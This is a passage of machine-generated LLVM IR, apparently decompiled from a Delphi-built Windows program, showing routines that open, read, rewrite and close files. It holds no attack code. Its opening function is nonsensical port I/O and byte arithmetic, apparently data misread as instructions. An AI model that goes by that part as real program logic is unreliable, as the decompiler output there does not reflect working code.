  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1475
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1475
  %9 = add i8 %6, %8, !insn.addr !1475
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1475
  store i8 %9, i8* %10, align 1, !insn.addr !1475
  %11 = load i32, i32* %eax, align 4, !insn.addr !1476
  %12 = add i32 %11, 114, !insn.addr !1476
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1476
  %14 = load i8, i8* %13, align 1, !insn.addr !1476
  %15 = udiv i32 %2, 256, !insn.addr !1476
  %16 = trunc i32 %15 to i8, !insn.addr !1476
  %17 = add i8 %14, %16, !insn.addr !1476
  store i8 %17, i8* %13, align 1, !insn.addr !1476
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1477
  %20 = add i8 %19, -32, !insn.addr !1477
  %21 = icmp ult i8 %19, 32, !insn.addr !1477
  %22 = icmp eq i8 %20, 0, !insn.addr !1477
  %23 = zext i8 %20 to i32, !insn.addr !1477
  %24 = and i32 %18, -256, !insn.addr !1477
  %25 = or i32 %24, %23, !insn.addr !1477
  store i32 %25, i32* %eax, align 4, !insn.addr !1477
  %26 = or i1 %21, %22, !insn.addr !1478
  br i1 %26, label %dec_label_pc_40687a, label %dec_label_pc_4068e9, !insn.addr !1478

dec_label_pc_40687a:                              ; preds = %dec_label_pc_406871
  %27 = add i32 %25, 105, !insn.addr !1479
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1479
  %29 = load i8, i8* %28, align 1, !insn.addr !1479
  %30 = and i8 %29, %16, !insn.addr !1479
  store i8 %30, i8* %28, align 1, !insn.addr !1479
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1480
  store i32 %31, i32* %eax, align 4, !insn.addr !1480
  %32 = trunc i32 %arg3 to i16, !insn.addr !1481
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1481
  %34 = load i8, i8* %33, align 1, !insn.addr !1481
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1481
  %35 = add i32 %arg5, 105, !insn.addr !1482
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1482
  %38 = load i8, i8* %37, align 1, !insn.addr !1482
  %39 = udiv i32 %arg2, 256, !insn.addr !1482
  %40 = trunc i32 %39 to i8, !insn.addr !1482
  %41 = and i8 %38, %40, !insn.addr !1482
  store i8 %41, i8* %37, align 1, !insn.addr !1482
  %42 = mul i32 %arg5, 2, !insn.addr !1483
  %43 = add i32 %arg2, 115, !insn.addr !1483
  %44 = add i32 %43, %42, !insn.addr !1483
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1483
  %46 = load i8, i8* %45, align 1, !insn.addr !1483
  %47 = trunc i32 %arg2 to i8, !insn.addr !1483
  %48 = add i8 %46, %47, !insn.addr !1483
  %49 = icmp eq i8 %48, 0, !insn.addr !1483
  store i8 %48, i8* %45, align 1, !insn.addr !1483
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1484
  br i1 %49, label %dec_label_pc_4068cb, label %dec_label_pc_406889, !insn.addr !1484

dec_label_pc_406889:                              ; preds = %dec_label_pc_40687a
  %50 = icmp slt i8 %48, 0, !insn.addr !1483
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1485
  %52 = load i32, i32* %51, align 4, !insn.addr !1485
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1485
  br i1 %50, label %dec_label_pc_406900, label %dec_label_pc_40688e, !insn.addr !1486

dec_label_pc_40688e:                              ; preds = %dec_label_pc_406889
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1487
  %55 = add i8 %54, -32, !insn.addr !1487
  %56 = icmp ult i8 %54, 32, !insn.addr !1487
  %57 = icmp eq i8 %55, 0, !insn.addr !1487
  %58 = zext i8 %55 to i32, !insn.addr !1487
  %59 = and i32 %53, -256, !insn.addr !1487
  %60 = or i32 %59, %58, !insn.addr !1487
  store i32 %60, i32* %eax, align 4, !insn.addr !1487
  %61 = or i1 %56, %57, !insn.addr !1488
  br i1 %61, label %dec_label_pc_406892, label %dec_label_pc_406901, !insn.addr !1488

dec_label_pc_406892:                              ; preds = %dec_label_pc_40688e
  %62 = add i32 %arg2, 105, !insn.addr !1489
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1489
  %64 = load i8, i8* %63, align 1, !insn.addr !1489
  %65 = udiv i32 %53, 256, !insn.addr !1489
  %66 = trunc i32 %65 to i8, !insn.addr !1489
  %67 = and i8 %64, %66, !insn.addr !1489
  store i8 %67, i8* %63, align 1, !insn.addr !1489
  %68 = add i32 %arg6, 105, !insn.addr !1490
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1490
  %70 = load i8, i8* %69, align 1, !insn.addr !1490
  %71 = and i8 %70, %40, !insn.addr !1490
  store i8 %71, i8* %69, align 1, !insn.addr !1490
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1491
  %74 = load i8, i8* %73, align 1, !insn.addr !1491
  %75 = trunc i32 %72 to i8, !insn.addr !1491
  %76 = add i8 %74, %75, !insn.addr !1491
  store i8 %76, i8* %73, align 1, !insn.addr !1491
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1492
  %79 = load i8, i8* %78, align 1, !insn.addr !1492
  %80 = trunc i32 %77 to i8, !insn.addr !1492
  %81 = add i8 %79, %80, !insn.addr !1492
  store i8 %81, i8* %78, align 1, !insn.addr !1492
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1493
  %83 = load i32, i32* %82, align 4, !insn.addr !1493
  %84 = add i32 %83, %arg6, !insn.addr !1493
  store i32 %84, i32* %82, align 4, !insn.addr !1493
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1494
  %87 = load i8, i8* %86, align 1, !insn.addr !1494
  %88 = trunc i32 %85 to i8, !insn.addr !1494
  %89 = add i8 %87, %88, !insn.addr !1494
  store i8 %89, i8* %86, align 1, !insn.addr !1494
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1495
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1496
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1496
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1496
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1497
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1498
  %93 = add i32 %92, 1, !insn.addr !1498
  %94 = icmp eq i32 %93, 0, !insn.addr !1498
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1498
  %95 = icmp eq i1 %94, false, !insn.addr !1499
  br i1 %95, label %dec_label_pc_4068c3, label %dec_label_pc_4068b9, !insn.addr !1499

dec_label_pc_4068b9:                              ; preds = %dec_label_pc_406892
  %96 = call i32 @"@LStrClr"(), !insn.addr !1500
  br label %dec_label_pc_4068c3, !insn.addr !1500

dec_label_pc_4068c3:                              ; preds = %dec_label_pc_4068b9, %dec_label_pc_406892
  store i32 0, i32* %eax, align 4, !insn.addr !1501
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1502
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1503
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1503
  br label %dec_label_pc_4068cb, !insn.addr !1503

dec_label_pc_4068cb:                              ; preds = %dec_label_pc_4068c3, %dec_label_pc_40687a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1504
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1504
  store i32 4221144, i32* %99, align 4, !insn.addr !1504
  %100 = load i32, i32* %eax, align 4, !insn.addr !1505
  ret i32 %100, !insn.addr !1505

dec_label_pc_4068e9:                              ; preds = %dec_label_pc_406871
  %101 = mul i32 %4, 2, !insn.addr !1506
  %102 = add i32 %1, 105, !insn.addr !1506
  %103 = add i32 %102, %101, !insn.addr !1506
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1506
  %105 = load i32, i32* %104, align 4, !insn.addr !1506
  %106 = or i32 %105, %3, !insn.addr !1506
  store i32 %106, i32* %104, align 4, !insn.addr !1506
  %107 = add i32 %0, -1, !insn.addr !1507
  %108 = trunc i32 %3 to i16, !insn.addr !1508
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1508
  %110 = load i32, i32* %109, align 4, !insn.addr !1508
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1508
  %111 = load i32, i32* %eax, align 4, !insn.addr !1509
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1509
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1509
  %115 = or i8 %112, %114, !insn.addr !1509
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1509
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1510
  %118 = load i8, i8* %117, align 1, !insn.addr !1510
  %119 = trunc i32 %116 to i8, !insn.addr !1510
  %120 = add i8 %118, %119, !insn.addr !1510
  store i8 %120, i8* %117, align 1, !insn.addr !1510
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1511
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1511
  %124 = load i8, i8* %123, align 1, !insn.addr !1511
  %125 = add i8 %124, %122, !insn.addr !1511
  %126 = zext i8 %125 to i32, !insn.addr !1511
  %127 = and i32 %121, -256, !insn.addr !1511
  %128 = or i32 %127, %126, !insn.addr !1511
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1512
  %130 = load i8, i8* %129, align 1, !insn.addr !1512
  %131 = trunc i32 %3 to i8, !insn.addr !1513
  %132 = add i8 %125, %131, !insn.addr !1512
  %133 = add i8 %132, %130, !insn.addr !1513
  store i8 %133, i8* %129, align 1, !insn.addr !1513
  %134 = add i32 %128, 1, !insn.addr !1514
  store i32 %134, i32* %eax, align 4, !insn.addr !1514
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1515
  %136 = load i8, i8* %135, align 1, !insn.addr !1515
  %137 = trunc i32 %134 to i8, !insn.addr !1515
  %138 = add i8 %136, %137, !insn.addr !1515
  store i8 %138, i8* %135, align 1, !insn.addr !1515
  br label %dec_label_pc_406900, !insn.addr !1515

dec_label_pc_406900:                              ; preds = %dec_label_pc_4068e9, %dec_label_pc_406889
  %139 = load i32, i32* %eax, align 4, !insn.addr !1515
  ret i32 %139, !insn.addr !1515

dec_label_pc_406901:                              ; preds = %dec_label_pc_40688e
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1516
  %141 = load i8, i8* %140, align 1, !insn.addr !1516
  %142 = add i8 %141, %55, !insn.addr !1516
  store i8 %142, i8* %140, align 1, !insn.addr !1516
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1517
  %145 = load i8, i8* %144, align 1, !insn.addr !1517
  %146 = trunc i32 %arg3 to i8, !insn.addr !1517
  %147 = add i8 %145, %146, !insn.addr !1517
  store i8 %147, i8* %144, align 1, !insn.addr !1517
  %148 = load i32, i32* %eax, align 4, !insn.addr !1518
  %149 = add i32 %148, 1, !insn.addr !1518
  %150 = mul i32 %149, 2, !insn.addr !1519
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1519
  %152 = load i8, i8* %151, align 2, !insn.addr !1519
  %153 = trunc i32 %149 to i8, !insn.addr !1519
  %154 = add i8 %152, %153, !insn.addr !1519
  store i8 %154, i8* %151, align 2, !insn.addr !1519
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1520
  %156 = load i8, i8* %155, align 1, !insn.addr !1520
  %157 = add i8 %156, %153, !insn.addr !1520
  store i8 %157, i8* %155, align 1, !insn.addr !1520
  ret i32 %149, !insn.addr !1521
}

define i32 @function_40691f() local_unnamed_addr {
dec_label_pc_40691f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1522
}

define i32 @function_40692c() local_unnamed_addr {
dec_label_pc_40692c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1523
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1524
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1524
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1524
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1525
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1526
  %3 = call i32 @function_4036c8(), !insn.addr !1527
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1528
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1528
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1528
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1529
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1530
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1531
  br i1 %7, label %dec_label_pc_406acb, label %dec_label_pc_406996, !insn.addr !1531

dec_label_pc_406996:                              ; preds = %dec_label_pc_40692c
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1529
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1532
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1532
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1533
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1534
  br i1 %12, label %dec_label_pc_406acb, label %dec_label_pc_4069b2, !insn.addr !1534

dec_label_pc_4069b2:                              ; preds = %dec_label_pc_406996
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1535
  %14 = call i32 @function_403720(), !insn.addr !1536
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1537
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1537
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1538
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1538
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1539
  %19 = call i32 @function_4046d4(), !insn.addr !1540
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406acb

dec_label_pc_406acb:                              ; preds = %dec_label_pc_4069b2, %dec_label_pc_406996, %dec_label_pc_40692c
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1541
  %21 = load i32, i32* %20, align 4, !insn.addr !1541
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1542
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1543
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1543
  store i32 4221677, i32* %23, align 4, !insn.addr !1543
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1544
  ret i32 %24, !insn.addr !1545
}

define i32 @function_406ae6() local_unnamed_addr {
dec_label_pc_406ae6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1546
  ret i32 %0, !insn.addr !1546
}

define i32 @function_406aeb() local_unnamed_addr {
dec_label_pc_406aeb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1547
}

define i32 @function_406aed(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406aed:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1548
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1548
  %3 = load i32, i32* %2, align 4, !insn.addr !1548
  ret i32 %3, !insn.addr !1549
}

define i32 @function_406b24() local_unnamed_addr {
dec_label_pc_406b24:
  %esp.2.reg2mem = alloca i32, !insn.addr !1550
  %esp.1.reg2mem = alloca i32, !insn.addr !1550
  %esi.0.reg2mem = alloca i32, !insn.addr !1550
  %esp.0.reg2mem = alloca i32, !insn.addr !1550
  %ebx.0.reg2mem = alloca i32, !insn.addr !1550
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1551
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1552
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1552
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1552
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1553
  %2 = call i32 @function_403c88(), !insn.addr !1554
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1555
  br i1 %3, label %dec_label_pc_406c0d, label %dec_label_pc_406b52, !insn.addr !1555

dec_label_pc_406b52:                              ; preds = %dec_label_pc_406b24
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1556
  %5 = call i32 @function_4036c8(), !insn.addr !1557
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1558
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1558
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1558
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1559
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1560
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1561
  br i1 %9, label %dec_label_pc_406c0d, label %dec_label_pc_406b8e, !insn.addr !1561

dec_label_pc_406b8e:                              ; preds = %dec_label_pc_406b52
  %10 = call i32 @"@LStrClr"(), !insn.addr !1562
  %11 = call i32 @function_403c90(), !insn.addr !1563
  %12 = icmp slt i32 %11, 0, !insn.addr !1564
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1565
  br i1 %12, label %dec_label_pc_406bd8, label %dec_label_pc_406ba6, !insn.addr !1565

dec_label_pc_406ba6:                              ; preds = %dec_label_pc_406b8e
  %13 = add i32 %11, 1, !insn.addr !1566
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1567
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1567
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1567
  br label %dec_label_pc_406ba9, !insn.addr !1567

dec_label_pc_406ba9:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406ba6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1568
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1568
  store i32 0, i32* %15, align 4, !insn.addr !1568
  %16 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1569
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1570
  %18 = add i32 %16, %17, !insn.addr !1570
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1570
  %20 = load i32, i32* %19, align 4, !insn.addr !1570
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1570
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1570
  store i32 %20, i32* %22, align 4, !insn.addr !1570
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1571
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1571
  store i32 ptrtoint (i32* @global_var_406c54 to i32), i32* %24, align 4, !insn.addr !1571
  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1572
  %26 = or i32 %17, 4, !insn.addr !1573
  %27 = add i32 %25, %26, !insn.addr !1573
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1573
  %29 = load i32, i32* %28, align 4, !insn.addr !1573
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1573
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1573
  store i32 %29, i32* %31, align 4, !insn.addr !1573
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1574
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1574
  store i32 ptrtoint ([3 x i8]* @global_var_406c60 to i32), i32* %33, align 4, !insn.addr !1574
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1575
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1576
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1577
  %37 = icmp eq i32 %36, 0, !insn.addr !1577
  %38 = icmp eq i1 %37, false, !insn.addr !1578
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1578
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1578
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1578
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1578
  br i1 %38, label %dec_label_pc_406ba9, label %dec_label_pc_406bd8, !insn.addr !1578

dec_label_pc_406bd8:                              ; preds = %dec_label_pc_406ba9, %dec_label_pc_406b8e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1559
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1579
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1580
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1580
  store i32 0, i32* %42, align 4, !insn.addr !1580
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1581
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1581
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1581
  store i32 %45, i32* %44, align 4, !insn.addr !1581
  %46 = call i32 @function_4034c8(), !insn.addr !1582
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1583
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1583
  store i32 %46, i32* %48, align 4, !insn.addr !1583
  %49 = call i32 @function_403720(), !insn.addr !1584
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1585
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1585
  store i32 %49, i32* %51, align 4, !insn.addr !1585
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1586
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1586
  store i32 %39, i32* %53, align 4, !insn.addr !1586
  %54 = call i32 @function_40446c(), !insn.addr !1587
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1588
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1588
  store i32 %39, i32* %56, align 4, !insn.addr !1588
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1589
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1590
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1590
  store i32 %39, i32* %59, align 4, !insn.addr !1590
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1591
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1592
  br label %dec_label_pc_406c0d, !insn.addr !1592

dec_label_pc_406c0d:                              ; preds = %dec_label_pc_406bd8, %dec_label_pc_406b52, %dec_label_pc_406b24
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1593
  %62 = load i32, i32* %61, align 4, !insn.addr !1593
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1594
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1595
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1595
  store i32 4221999, i32* %64, align 4, !insn.addr !1595
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1596
  ret i32 %65, !insn.addr !1597
}

define i32 @function_406c28() local_unnamed_addr {
dec_label_pc_406c28:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1598
  ret i32 %0, !insn.addr !1598
}

define i32 @function_406c2d() local_unnamed_addr {
dec_label_pc_406c2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1599
}

define i32 @function_406c2f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406c2f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1600
}

define i32 @function_406c64() local_unnamed_addr {
dec_label_pc_406c64:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1601
  %1 = call i32 @function_4036b8(), !insn.addr !1602
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1603
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1603
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1603
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1604
  %4 = call i32 @function_403c90(), !insn.addr !1605
  %5 = icmp slt i32 %4, 0, !insn.addr !1606
  br i1 %5, label %dec_label_pc_406cec, label %dec_label_pc_406cba, !insn.addr !1607

dec_label_pc_406cba:                              ; preds = %dec_label_pc_406c64
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1608
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1609
  br label %dec_label_pc_406d38

dec_label_pc_406cec:                              ; preds = %dec_label_pc_406c64
  %8 = call i32 @function_403c88(), !insn.addr !1610
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1611
  %10 = call i32 @function_403c90(), !insn.addr !1612
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1613
  %12 = call i32 @function_403c90(), !insn.addr !1614
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1615
  %14 = call i32 @function_406b24(), !insn.addr !1616
  br label %dec_label_pc_406d38, !insn.addr !1616

dec_label_pc_406d38:                              ; preds = %dec_label_pc_406cba, %dec_label_pc_406cec
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1617
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1618
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1619
  ret i32 %16, !insn.addr !1620
}

define i32 @function_406d53() local_unnamed_addr {
dec_label_pc_406d53:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1621
  ret i32 %0, !insn.addr !1621
}

define i32 @function_406d58() local_unnamed_addr {
dec_label_pc_406d58:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1622
}

define i32 @function_406d5a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406d5a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1623
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1623
  %3 = load i32, i32* %2, align 4, !insn.addr !1623
  ret i32 %3, !insn.addr !1624
}

define i32 @function_406d64() local_unnamed_addr {
dec_label_pc_406d64:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1625
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1625
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1625
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1626
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1627
  %3 = add i32 %2, 1, !insn.addr !1627
  %4 = icmp eq i32 %3, 0, !insn.addr !1627
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1627
  %5 = icmp eq i1 %4, false, !insn.addr !1628
  br i1 %5, label %dec_label_pc_406d9c, label %dec_label_pc_406d7d, !insn.addr !1628

dec_label_pc_406d7d:                              ; preds = %dec_label_pc_406d64
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1629
  %7 = icmp eq i32 %6, 0, !insn.addr !1629
  br i1 %7, label %dec_label_pc_406d8c, label %dec_label_pc_406d87, !insn.addr !1630

dec_label_pc_406d87:                              ; preds = %dec_label_pc_406d7d
  %8 = call i32 @function_406b24(), !insn.addr !1631
  br label %dec_label_pc_406d8c, !insn.addr !1631

dec_label_pc_406d8c:                              ; preds = %dec_label_pc_406d87, %dec_label_pc_406d7d
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1632
  br label %dec_label_pc_406d9c, !insn.addr !1632

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d8c, %dec_label_pc_406d64
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1633
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1634
  ret i32 0, !insn.addr !1635
}

define i32 @function_406daa() local_unnamed_addr {
dec_label_pc_406daa:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1636
  ret i32 %0, !insn.addr !1636
}

define i32 @function_406daf() local_unnamed_addr {
dec_label_pc_406daf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1637
}

define i32 @function_406db1(i32 %arg1) local_unnamed_addr {
dec_label_pc_406db1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1638
}

define i32 @function_406db4() local_unnamed_addr {
dec_label_pc_406db4:
